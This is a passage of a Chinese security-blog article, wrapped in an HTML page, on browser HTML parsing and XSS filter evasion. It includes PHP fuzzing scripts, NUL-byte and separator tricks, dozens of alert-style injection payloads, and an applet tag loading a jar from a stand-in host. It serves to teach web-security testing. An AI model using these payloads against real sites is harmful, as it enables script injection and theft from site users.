@@ -1,0 +1,1479 @@
+<!DOCTYPE html>
+<html lang="zh-cn" itemscope itemtype="http://schema.org/WebPage">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>Browser Security-超文本标记语言（HTML） - Nuclear&#39;Atk（核攻击）网络安全实验室</title>
+  
+
+<meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta name="MobileOptimized" content="width"/>
+<meta name="HandheldFriendly" content="true"/>
+
+
+<meta name="applicable-device" content="pc,mobile">
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="mobile-web-app-capable" content="yes">
+
+<meta name="author" content="瞌睡龙" /><meta name="description" content="Browser Security-超文本标记语言（HTML）。重要的4个规则： 1 &符号不应该出现在HTML的大部分节点中。2 尖括号&lt;&gt;是不应该出现在标签内的，除非为引号引用。3 在text节点里面，&lt;左尖括号有很大的危害。4 引号在标签内可能有危害，具体危害取决于存在的位置，但是在text节点是没有危害的。文件解析模式 在任何HTML文档中，最开始的&lt;!DOCTYPE&gt;用来指示浏览器需要解析的方式，同样也可使用Content-Type头来告诉浏览器。一般情况下，浏览器中的解析器会尝试恢复大多数类型的语法错误，包括开始和结束标记。在XML中，是非常严格的，所有标签必须有对应的开始关闭，也可以有自动关闭如也是允许的。" />
+<meta name="keywords" content="Browser Security-超文本标记语言（HTML）" />
+
+
+
+<meta name="baidu-site-verification" content="GSIJv096Bu" />
+
+
+
+<meta name="generator" content="Hugo 0.82.0" />
+
+
+<link rel="canonical" href="https://lcx.cc/post/3644/" />
+
+
+
+
+
+<link rel="icon" href="/favicon.ico" />
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/sass/jane.min.af20b78e95c84de86b00a0242a4a77bd2601700e1b250edf27537d957ac0041d.css" integrity="sha256-ryC3jpXITehrAKAkKkp3vSYBcA4bJQ7fJ1N9lXrABB0=" media="screen" crossorigin="anonymous">
+
+
+
+
+
+<meta property="og:title" content="Browser Security-超文本标记语言（HTML）" />
+<meta property="og:description" content="Browser Security-超文本标记语言（HTML）。重要的4个规则： 1 &amp;符号不应该出现在HTML的大部分节点中。2 尖括号&lt;&gt;是不应该出现在标签内的，除非为引号引用。3 在text节点里面，&lt;左尖括号有很大的危害。4 引号在标签内可能有危害，具体危害取决于存在的位置，但是在text节点是没有危害的。文件解析模式 在任何HTML文档中，最开始的&lt;!DOCTYPE&gt;用来指示浏览器需要解析的方式，同样也可使用Content-Type头来告诉浏览器。一般情况下，浏览器中的解析器会尝试恢复大多数类型的语法错误，包括开始和结束标记。在XML中，是非常严格的，所有标签必须有对应的开始关闭，也可以有自动关闭如&lt;img/&gt;也是允许的。" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://lcx.cc/post/3644/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2013-07-02T11:03:56&#43;08:00" />
+<meta property="article:modified_time" content="2013-07-02T11:03:56&#43;08:00" />
+
+<meta itemprop="name" content="Browser Security-超文本标记语言（HTML）">
+<meta itemprop="description" content="Browser Security-超文本标记语言（HTML）。重要的4个规则： 1 &amp;符号不应该出现在HTML的大部分节点中。2 尖括号&lt;&gt;是不应该出现在标签内的，除非为引号引用。3 在text节点里面，&lt;左尖括号有很大的危害。4 引号在标签内可能有危害，具体危害取决于存在的位置，但是在text节点是没有危害的。文件解析模式 在任何HTML文档中，最开始的&lt;!DOCTYPE&gt;用来指示浏览器需要解析的方式，同样也可使用Content-Type头来告诉浏览器。一般情况下，浏览器中的解析器会尝试恢复大多数类型的语法错误，包括开始和结束标记。在XML中，是非常严格的，所有标签必须有对应的开始关闭，也可以有自动关闭如&lt;img/&gt;也是允许的。"><meta itemprop="datePublished" content="2013-07-02T11:03:56&#43;08:00" />
+<meta itemprop="dateModified" content="2013-07-02T11:03:56&#43;08:00" />
+<meta itemprop="wordCount" content="7506">
+<meta itemprop="keywords" content="Html,app,CSS,EXP,Google,HTTP,IE,IP,Java,js,Net,PHP,POS,URL,VB,VBS,XSS,编码,测试,代码,解码,浏览器,绕过,事件,数据,讨论,文件,问题,协议," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Browser Security-超文本标记语言（HTML）"/>
+<meta name="twitter:description" content="Browser Security-超文本标记语言（HTML）。重要的4个规则： 1 &amp;符号不应该出现在HTML的大部分节点中。2 尖括号&lt;&gt;是不应该出现在标签内的，除非为引号引用。3 在text节点里面，&lt;左尖括号有很大的危害。4 引号在标签内可能有危害，具体危害取决于存在的位置，但是在text节点是没有危害的。文件解析模式 在任何HTML文档中，最开始的&lt;!DOCTYPE&gt;用来指示浏览器需要解析的方式，同样也可使用Content-Type头来告诉浏览器。一般情况下，浏览器中的解析器会尝试恢复大多数类型的语法错误，包括开始和结束标记。在XML中，是非常严格的，所有标签必须有对应的开始关闭，也可以有自动关闭如&lt;img/&gt;也是允许的。"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+
+
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Nuclear'Atk</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+        
+      </li>
+    
+
+    
+  </ul>
+</nav>
+
+
+  
+    
+
+
+
+
+
+
+  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
+  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />
+
+
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+  
+
+  
+
+  
+
+  <header id="header" class="header container">
+    <div class="logo-wrapper">
+  <a href="/" class="logo">
+    
+      Nuclear'Atk
+    
+  </a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+
+        
+
+      </li>
+    
+
+    
+    
+
+    
+  </ul>
+</nav>
+
+  </header>
+
+  <div id="mobile-panel">
+    <main id="main" class="main bg-llight">
+      <div class="content-wrapper">
+        <div id="content" class="content container">
+          <article class="post bg-white">
+    
+    <header class="post-header">
+      <h1 class="post-title">Browser Security-超文本标记语言（HTML）</h1>
+      
+      <div class="post-meta">
+        <time datetime="2013-07-02" class="post-time">
+          2013-07-02
+        </time>
+        <div class="post-category">
+            <a href="https://lcx.cc/categories/%E8%80%81%E7%B3%BB%E7%BB%9F%E5%86%85%E5%AE%B9/"> 老系统内容 </a>
+            <a href="https://lcx.cc/categories/html/"> Html </a>
+            
+          </div>
+        <span class="more-meta"> 约 7506 字 </span>
+          <span class="more-meta"> 预计阅读 15 分钟 </span>
+
+        
+        
+
+        
+        
+      </div>
+    </header>
+
+    
+    
+<div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content">
+    
+  </div>
+</div>
+
+    
+    <div class="post-content">
+      
+<p style="text-indent:2em;">
+	<strong>重要的4个规则：</strong> 
+</p>
+<p style="text-indent:2em;">
+	1 &amp;符号不应该出现在HTML的大部分节点中。
+</p>
+<p style="text-indent:2em;">
+	2 尖括号&lt;&gt;是不应该出现在标签内的，除非为引号引用。
+</p>
+<p style="text-indent:2em;">
+	3 在text节点里面，&lt;左尖括号有很大的危害。
+</p>
+<p style="text-indent:2em;">
+	4 引号在标签内可能有危害，具体危害取决于存在的位置，但是在text节点是没有危害的。
+</p>
+<p style="text-indent:2em;">
+	<strong>文件解析模式</strong> 
+</p>
+<p style="text-indent:2em;">
+	在任何HTML文档中，最开始的<code>&lt;!DOCTYPE&gt;</code>用来指示浏览器需要解析的方式，同样也可使用<code>Content-Type</code>头来告诉浏览器。
+</p>
+<p style="text-indent:2em;">
+	一般情况下，浏览器中的解析器会尝试恢复大多数类型的语法错误，包括开始和结束标记。
+</p>
+<p style="text-indent:2em;">
+	在XML中，是非常严格的，所有标签必须有对应的开始关闭，也可以有自动关闭如&lt;img/&gt;也是允许的。
+</p>
+<p style="text-indent:2em;">
+	<strong>了解HTML解析</strong> 
+</p>
+<p style="text-indent:2em;">
+	<a href="/file/old/2480_html.jpeg" target="_blank"><img title="html" alt="html" src="/file/old/2480_html.jpeg" width="780" height="144" /></a> 
+</p>
+<p style="text-indent:2em;">
+	在IE浏览器中允许在1中插入NUL字符(0x00)，可以绕过非常多的xss过滤器。
+</p>
+<p style="text-indent:2em;">
+	如下php代码可把NUL字符插入标签内做测试：
+</p>
+<p style="text-indent:2em;">
+	2和4中的空格也可以由tab(0x0B)与换页键(0x0C)，2处也可以用/来代替。
+</p>
+<p style="text-indent:2em;">
+	5中的"在IE中也可替换成`。
+</p>
+<p style="text-indent:2em;">
+	IE当中还有一个特性是当遇到=后面紧跟一个引号的时候会有奇怪的解析。
+</p>
+<pre class="prettyprint">&lt;img src=test.jpg?value="&gt;Yes, we are still inside a tag!"&gt;
+&lt;comment&gt;&lt;img src="&lt;comment&gt;&lt;img src=x onerror=alert(1)//"&gt;</pre>
+<p style="text-indent:2em;">
+	<strong>Entity编码</strong> 
+</p>
+<p style="text-indent:2em;">
+	HTML解析器在建立文档树的时候会针对节点内的Entity编码解码后传输。
+</p>
+<p style="text-indent:2em;">
+	以下两个表示相同：
+</p>
+<pre class="prettyprint">&lt;img src="http://www.example.com"&gt;
+&lt;img src="ht&amp;#x74;p&amp;#x3a;//www.example.com"&gt;</pre>
+<p style="text-indent:2em;">
+	下面两个例子代码不会执行，因为，编码的是标签本身的结构而非节点内的内容：
+</p>
+<pre class="prettyprint">&lt;img src&amp;#x3d;"http://www.example.com"&gt;
+&lt;img s&amp;#x72;c="http://www.example.com"&gt;</pre>
+<p style="text-indent:2em;">
+	<strong>Fuzzing</strong> 
+</p>
+<p style="text-indent:2em;">
+	对一个普通的HTML进行Fuzzing测试：
+</p>
+<pre class="prettyprint">&lt;a href="http://www.google.com/"&gt;Click me&lt;/a&gt;</pre>
+<p style="text-indent:2em;">
+	看一下可以Fuzzing的位置
+</p>
+<table border="1" align="center">
+	<thead>
+		<tr>
+			<th>
+				位置
+			</th>
+			<th>
+				代码
+			</th>
+			<th>
+				可能插入或替代的代码
+			</th>
+		</tr>
+	</thead>
+	<tbody>
+		<tr>
+			<td>
+				&lt;的右边
+			</td>
+			<td>
+				<code>&lt;[here]a href="...</code> 
+			</td>
+			<td>
+				控制符，空白符，非打印字符
+			</td>
+		</tr>
+		<tr>
+			<td>
+				a标签的后门
+			</td>
+			<td>
+				<code>&lt;a[here]href="...</code> 
+			</td>
+			<td>
+				同上
+			</td>
+		</tr>
+		<tr>
+			<td>
+				href属性中间
+			</td>
+			<td>
+				<code>&lt;a hr[here]ef="...</code> 
+			</td>
+			<td>
+				同上+空字节
+			</td>
+		</tr>
+		<tr>
+			<td>
+				=两边
+			</td>
+			<td>
+				<code>&lt;a href[here]=[here]"...</code> 
+			</td>
+			<td>
+				所有字符
+			</td>
+		</tr>
+		<tr>
+			<td>
+				替换=
+			</td>
+			<td>
+				<code>&lt;a href[here]"...</code> 
+			</td>
+			<td>
+				Union编码符号
+			</td>
+		</tr>
+		<tr>
+			<td>
+				替换"
+			</td>
+			<td>
+				<code>&lt;a href=[here]…[here]&gt;</code> 
+			</td>
+			<td>
+				其他引号
+			</td>
+		</tr>
+		<tr>
+			<td>
+				&gt;之前
+			</td>
+			<td>
+				<code>&lt;a href="…"[here]&gt;</code> 
+			</td>
+			<td>
+				任意字符
+			</td>
+		</tr>
+		<tr>
+			<td>
+				/之前
+			</td>
+			<td>
+				<code>&lt;a href="…"&gt;...&lt;[here]/a&gt;</code> 
+			</td>
+			<td>
+				空白符，控制符
+			</td>
+		</tr>
+		<tr>
+			<td>
+				/之后
+			</td>
+			<td>
+				<code>&lt;a href="…"&gt;...&lt;/[here]a&gt;</code> 
+			</td>
+			<td>
+				空白符，控制符
+			</td>
+		</tr>
+		<tr>
+			<td>
+				&gt;闭合之前
+			</td>
+			<td>
+				<code>&lt;a href="…"&gt;…&lt;/a[here]&gt;</code> 
+			</td>
+			<td>
+				所有字符
+			</td>
+		</tr>
+	</tbody>
+</table>
+<p style="text-indent:2em;">
+	可以使用php代码进行快速测试，例如我们对第一个位置（&lt;的右边）进行Fuzzing：
+</p>
+<pre class="prettyprint">&lt;?php
+for($i = 0; $i &lt;= 255; $i++) {
+$character = chr($i);
+#  &lt;右边进行测试
+echo '&lt;div&gt;&lt;'.$character.'a href="http://www.google.com/"&gt;'.$i.'&lt;/a&gt;&lt;/div&gt;'; }
+?&gt;</pre>
+<p style="text-indent:2em;">
+	上面的代码只测试了256个字符，如果想要测试Unicode的所有字符，则需要创建65536个链接。
+</p>
+<p style="text-indent:2em;">
+	php默认字符是ISO-8859-1作为默认的字符编码，而这种编码只有256个字符，所以单纯的循环65536遍是没用的。
+</p>
+<p style="text-indent:2em;">
+	所以采用Entity编码方式循环，解码后输出：
+</p>
+<pre class="prettyprint">&lt;?php
+for($i = 0; $i &lt;= 65535; $i++) {
+$character = html_entity_decode('&amp;#'.$i.';', ENT_QUOTES, 'UTF-8')
+# &lt;右边进行测试
+echo '&lt;div&gt;&lt;'.$character.'a href="http://www.google.com/"&gt;'.$i.'&lt;/a&gt;&lt;/div&gt;';
+}?&gt;</pre>
+<p style="text-indent:2em;">
+	有一个有趣的现象是几乎所有浏览器对<code>$#33;</code>即<code>!</code>，浏览器会<code>&lt;!</code>当成注释的开始，然后自动补齐剩下的代码，浏览器解析后的代码：
+</p>
+<pre class="prettyprint">&lt;div&gt;&lt;!--a href="http://www.google.com/"--&gt;33&lt;/div&gt;</pre>
+<p style="text-indent:2em;">
+	<strong>针对标签名的Fuzzing：</strong> 
+</p>
+<pre class="prettyprint">&lt;L? onclick=alert(1)&gt;click me&lt;/L?&gt;</pre>
+<p style="text-indent:2em;">
+	上面的代码，在Chrom、Firefox和Safari中点击，可以顺利弹出1。
+</p>
+<p style="text-indent:2em;">
+	讨论一下空字符的问题，IE浏览器会自动忽略空字符，并解析剩下的代码，这样会绕过很多采用正则匹配黑名单字符串的过滤器。
+</p>
+<p style="text-indent:2em;">
+	并且，很多函数和库并没有意识到这个问题：
+</p>
+<pre class="prettyprint">&lt;?php
+echo '&lt;im'.chr(0).'g sr'.chr(0).'c=x onerror=ale'.chr(0).'rt(1)&gt;';
+?&gt;</pre>
+<p style="text-indent:2em;">
+	用IE8打开上述代码的网页，查看源代码只能看到"&lt;im"后面的字符都隐藏了。
+</p>
+<p style="text-indent:2em;">
+	还有两种方式可以对标签名Fuzzing，第一种是涉及字符集的问题，第二种是针对php中在过滤之前使用了utf8_decode()函数。
+</p>
+<pre class="prettyprint">&lt;?php
+header('Content-Type: text/html;charset=Shift_JIS');
+for($i = 1; $i &lt;= 255; $i++) {    
+    $character = html_entity_decode('&amp;#'.$i.';', ENT_QUOTES, 'UTF-8');    
+    $character = utf8_decode($character);    
+    echo $character.'123456 '.$i."&lt;br&gt;\r\n";
+} ?&gt;</pre>
+<p style="text-indent:2em;">
+	代码很简单，设置返回响应字符集为Shift_JIS，然后把utf-8转换为Shift_JIS字符集。
+</p>
+<p style="text-indent:2em;">
+	可以看到在IE中129-159和224-252中，123456中的1消失了，与前面的字符合并成一个字符了。
+</p>
+<p style="text-indent:2em;">
+	标签后面也可加入/符号做间隔：
+</p>
+<pre class="prettyprint">&lt;img/src=x onerror=alert(1)&gt;</pre>
+<p style="text-indent:2em;">
+	尝试在标签与/之间再插入其他字符来测试，由于空字符无法直观显示，所以用\0来表示null，同样主流浏览器都可以执行：
+</p>
+<pre class="prettyprint">&lt;img\0/src=x onerror=alert(1)&gt;</pre>
+<p style="text-indent:2em;">
+	再尝试ASCII码之外的字符，这种字符在正则表达式中\w是无法匹配到的，主流浏览器都可以执行：
+</p>
+<pre class="prettyprint">&lt;img/ \/\μ src=x onerror=alert(1)//&gt;</pre>
+<p style="text-indent:2em;">
+	测试发现，标签名与属性名直接只要是以/开头以/或"结尾，中间几乎可以插入任意字符。
+</p>
+<p style="text-indent:2em;">
+	在Fuzzing属性方面，考虑两方面，一个是可以使用什么分隔符，一个是属性值可以采用什么编码。
+</p>
+<p style="text-indent:2em;">
+	分隔符有很多种，单引号，双引号，无任何引号，反撇号（IE中）。
+</p>
+<pre class="prettyprint">&lt;?php
+for($i = 1; $i &lt;= 255; $i++) {
+    $character = chr($i);
+    echo '&lt;div&gt;&lt;font size='. $character. '20'. $character. '&gt;'.$i.' &lt;/font&gt;&lt;/div&gt;';
+} ?&gt;</pre>
+<p style="text-indent:2em;">
+	上面代码可以直观的看出当前浏览器支持的分隔符有哪些字符。
+</p>
+<p style="text-indent:2em;">
+	上面代码size属性如果输入的是字符的话，会顺利执行，所以当$character中循环到数字的时候也会顺利解析，但这并非是把数字当成了分割符：
+</p>
+<pre class="prettyprint">&lt;?php
+for($i = 20; $i &lt;= 255; $i++) {
+    $character = html_entity_decode('&amp;#'.$i.';', ENT_QUOTES, 'UTF-8');
+    echo '&lt;div&gt;&lt;img title="'.$i.'" src='.$character. 'http://www.google.com/intl/en_ALL/images/logo.gif'. $character. '&gt;&lt;/div&gt;';
+} ?&gt;</pre>
+<p style="text-indent:2em;">
+	以上代码可以看出，属性为字符串的时候，可以作为分隔符的字符。
+</p>
+<p style="text-indent:2em;">
+	为了表示那些不可打印的字符，就用<code>\x十六进制</code>来表示：
+</p>
+<pre class="prettyprint">&lt;img src=\x17\x17 onerror=alert(1)//&gt;</pre>
+<p style="text-indent:2em;">
+	以上代码\x17即表示不可打印字符chr(23)，浏览器提交的时候可以输入%3Cimg%20src%3D%17%17%20onerror%3Dalert%281%29%2f%2f%3E。
+</p>
+<p style="text-indent:2em;">
+	在src中可以正常工作的分隔字符，在处理事件的属性里不一定会工作，例如onerror。
+</p>
+<p style="text-indent:2em;">
+	但是仍然有一些字符可以达到我们的目的，ASCII表中的133和160已经IE中的空字符，甚至是分号。
+</p>
+<pre class="prettyprint">&lt;img/\%20src=%17y%17 onerror=%C2%A0alert(1)//&gt;</pre>
+<p style="text-indent:2em;">
+	以上代码urldecode之后在chrome中可以顺利执行。
+</p>
+<p style="text-indent:2em;">
+	下面讨论多个标签的问题，比如用户可控的数据插入到了<code>&lt;input&gt;</code>标签中，同时过滤了<code>&lt;&gt;</code>只能插入标签内数据：
+</p>
+<pre class="prettyprint">&lt;input value="" type=image src=1 onerror=alert(1)//" type="hidden" name="foo" /&gt;</pre>
+<p style="text-indent:2em;">
+	绿色部分是我们插入的数据，又插入了一个type属性，但是浏览器执行了alert()，浏览器实际上会执行第一个属性，后面的会忽略掉。
+</p>
+<p style="text-indent:2em;">
+	在IE中还有一个lowsrc的属性，跟src类似，原本是为了方便调用一个缩略图的，但是在IE6和IE7中，同时也支持伪协议javascript:，还有一个dynsrc属性也类似：
+</p>
+<pre class="prettyprint">&lt;img lowsrc=1 onerror=alert(1)&gt; // 所有IE都支持
+&lt;img lowsrc=javascript:alert(2)&gt; //IE6和IE7支持
+&lt;img src="http://www.google.de/intl/de_de/images/logo.gif" dynsrc="javascript:alert(3)" /&gt; // 只有IE6支持</pre>
+<p style="text-indent:2em;">
+	sytle属性中还可以定义非常多的参数：
+</p>
+<pre class="prettyprint">&lt;span style="color:red" style="color:green;background:yellow"&gt; foobar&lt;/span&gt;</pre>
+<p style="text-indent:2em;">
+	上面代码可以看到，浏览器显示的字体为红色，背景为黄色，除了定义颜色之外也可以用expression()执行js，后面会讨论。
+</p>
+<p style="text-indent:2em;">
+	还有一个属性是专门用来在一个标签中插入多个的：xmlns，XML的命名空间属性，这个后面会在XML中讨论。
+</p>
+<p style="text-indent:2em;">
+	还有一处可Fuzzing的点即为标签的关闭，一个有趣的现象是浏览器把<code>&lt;br/&gt;</code>与<code>&lt;/br&gt;</code>，<code>&lt;p/&gt;</code>与<code>&lt;/p&gt;</code>成完全一样。
+</p>
+<pre class="prettyprint">&lt;b &gt; foobar&lt;/b style="x:expression(alert(1))"&gt; // 不会执行alert
+&lt;b &gt; foo&lt;/b &gt; bar&lt;/b style="x:expression(alert(2))"&gt; // IE执行了alert
+&lt;script src="http://0x.lv"&gt;&lt;/b&gt; // 不会执行</pre>
+<p style="text-indent:2em;">
+	可以执行的代码为没有开始标签的一个闭合标签，IE8中，sytle属性可以插在一个闭合标签内，并顺利执行。
+</p>
+<p style="text-indent:2em;">
+	可混淆的另一个方法是:可替换为=，下面例子在IE8中可执行：
+</p>
+<pre class="prettyprint">&lt;//style=x:expression(if(!window.x){window.x=1;alert(1);})&gt;
+&lt;//style='x=expr\65 ssion(if(!window.x){window.x=1;alert(1);})'&gt;
+&lt;/a/style='x= \a expr\65 ss/*\&amp;#x2a/ion(if(!window.x){window.x=1;alert(1);})'&gt;</pre>
+<p style="text-indent:2em;">
+	HTML代码中执行js的各种方式，用以下方式定义的时候，VBscript和JavaScript都可以执行。
+</p>
+<pre class="prettyprint">&lt;script language=vbs&gt;
+alert+1'VBScript
+alert(2)// JavaScript
+&lt;/script&gt;</pre>
+<p style="text-indent:2em;">
+	也有利用标签中的属性来执行js，例如：onclick，onload，onerror等等。
+</p>
+<p style="text-indent:2em;">
+	在iframe标签中，不需要src属性就可以顺利执行onload属性，而img标签不可以。
+</p>
+<p style="text-indent:2em;">
+	这是因为在iframe中没有src属性的时候，浏览器会自动加载about:blank页面，即空白页。
+</p>
+<p style="text-indent:2em;">
+	附件tag.php可以方便的看到当前浏览器针对各标签在不需要用户交互的情况下，可以自动执行的所有属性。
+</p>
+<p style="text-indent:2em;">
+	<a href="http://wydrops-wordpress.stor.sinaapp.com/uploads/2013/06/tag-event.php_.zip" target="_blank">tag-event.php</a> 
+</p>
+<p style="text-indent:2em;">
+	从输出结果可以看到body标签支持非常多的属性可以在与用户没有交互的情况下执行js。
+</p>
+<p style="text-indent:2em;">
+	例如load，error事件，所有的mouse和keyboard事件，以及在用户离开时的blur事件，还有unload和beforeunload，以及大家很少知道的pageshow属性。
+</p>
+<p style="text-indent:2em;">
+	同样标签中也有很少遇到的marquee标签：
+</p>
+<pre class="prettyprint">&lt;marquee onscroll=alert(1)&gt;</pre>
+<p style="text-indent:2em;">
+	在Chrome中，html标签也可以执行非常多的属性，，同源frameset标签也接受focus和blur事件。
+</p>
+<p style="text-indent:2em;">
+	一个很有趣的例子是，让scroll事件可以无交互触发，我们可以引入一个锚点，例如：
+</p>
+<p style="text-indent:2em;">
+	<code>&lt;a name="bottom"&gt;</code>或者通过id属性<code>&lt;div id="bottom"&gt;</code> 
+</p>
+<p style="text-indent:2em;">
+	那我们可以访问http://test.com/test.html#bottom来访问，浏览器自动滚到该锚点，触发scroll属性。
+</p>
+<pre class="prettyprint">&lt;body onscroll="alert(1)"&gt;
+&lt;div style="height:10000px"&gt;some text&lt;/div&gt;
+&lt;a name="bottom"&gt;&lt;/a&gt;
+&lt;/body&gt;</pre>
+<p style="text-indent:2em;">
+	1.html为以上代码，访问1.html#bottom会自动触发onscroll事件。
+</p>
+<p style="text-indent:2em;">
+	IE中hr标签中的onresize属性，在当前窗口大小变化时，会触发resize事件，执行alert(1)。
+</p>
+<pre class="prettyprint">&lt;hr onresize=alert(1)&gt;</pre>
+<p style="text-indent:2em;">
+	还有非常多的组合可以在IE中使用，很难全部列出来，只列举出几个很少见的例子：
+</p>
+<pre class="prettyprint">&lt;bgsound onpropertychange=alert(1)&gt;
+&lt;body onpropertychange=alert(2)&gt;
+&lt;body onmove=alert(3)&gt;
+&lt;body onfocusin=alert(4)&gt;
+&lt;body onbeforeactivate=alert(5)&gt;
+&lt;body onactivate=alert(6)&gt;
+&lt;embed onmove=alert(7)&gt;
+&lt;object onerror=alert(8)&gt;
+&lt;style onreadystatechange=alert(9) &gt;
+&lt;xml onreadystatechange=alert(10) &gt;
+&lt;xml onpropertychange=alert(11) &gt;
+&lt;table&gt;&lt;td background=javascript:alert(12) &gt;</pre>
+<p style="text-indent:2em;">
+	除了以上on的各种属性之外，src和href属性由于支持javascript和vbscript（只支持IE）伪协议，所以也是可以执行javascript代码：
+</p>
+<pre class="prettyprint">&lt;a href="javascript:alert(1)"&gt;click me&lt;/a&gt;
+&lt;a href="vbscript:alert(2)"&gt;click me&lt;/a&gt;</pre>
+<p style="text-indent:2em;">
+	代码执行时必须使用()，不可以使用vbscript中的alert+2，当点击之后，会弹出一个写在当前页面DOM中的数字2的警告框。
+</p>
+<p style="text-indent:2em;">
+	javascript:和vbscript:协议执行后的结果将会映射在DOM后面。
+</p>
+<pre class="prettyprint">&lt;a href="javascript:'\x3cimg src\x3dx onerror=alert(document.domain)&gt;'"&gt;click me&lt;/a&gt;</pre>
+<p style="text-indent:2em;">
+	以上代码在IE和Firefox中点击click me之后可执行，并且可以看到弹出的domain为a标签中所在的domain。
+</p>
+<p style="text-indent:2em;">
+	以上代码需要用户交互，下面看个不需要用户交互的例子，使用object标签和data:标签：
+</p>
+<pre class="prettyprint">&lt;object data="javascript:alert(1)"&gt;
+&lt;object data="data:text/html,&lt;script&gt;alert(2)&lt;/script &gt; "&gt;
+&lt;object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg"&gt;</pre>
+<p style="text-indent:2em;">
+	以上三个在Firefox中可执行，第二个可在Opera中执行，把各标签中各属性支持javascript的总结了一些：
+</p>
+<pre class="prettyprint">&lt;iframe src="javascript:alert(1)"&gt; // 火狐，Chrome, IE8
+&lt;embed src="javascript:alert(2)"&gt; // 火狐
+&lt;img src="javascript:alert(4)"&gt; // IE6
+&lt;image src="javascript:alert(5)"&gt; // IE6
+&lt;body background="javascript:alert(5)"&gt; // IE6
+&lt;script src="javascript:alert(6)"&gt; // IE6
+&lt;table background="javascript:alert(7)"&gt; // IE6
+&lt;isindex type="image" src="javascript:alert(8)"&gt; // IE6-7</pre>
+<p style="text-indent:2em;">
+	以及applet标签中code和archive属性可以用来调用jar文件，执行java代码。
+</p>
+<pre class="prettyprint">&lt;applet code="XSS" archive="http://someserver.com/xss.jar"&gt;&lt;/applet&gt;</pre>
+<p style="text-indent:2em;">
+	Javascript可以通过DOM直接获取当前页面中对应的id和name属性的对象：
+</p>
